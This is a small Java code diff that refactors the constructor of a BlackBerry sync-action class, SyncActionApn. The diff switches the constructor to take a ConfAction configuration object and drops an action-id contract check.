@@ -16,6 +16,7 @@ import net.rim.device.api.util.DataBuffer;
 import blackberry.action.Apn;
 import blackberry.action.sync.transport.ApnTransport;
 import blackberry.action.sync.transport.Wap2Transport;
+import blackberry.config.ConfAction;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.utils.Check;
@@ -28,12 +29,9 @@ public class SyncActionApn extends SyncAction {
 
     String host;
 
-    public SyncActionApn(final int actionId_, final byte[] confParams) {
-        super(actionId_, confParams);
-
-        //#ifdef DBC
-        Check.requires(actionId == ACTION_SYNC_APN, "Wrong ActionId");
-        //#endif
+ 
+    public SyncActionApn(ConfAction conf) {
+        super(conf);
     }
 
     protected boolean parse(final byte[] confParams) {
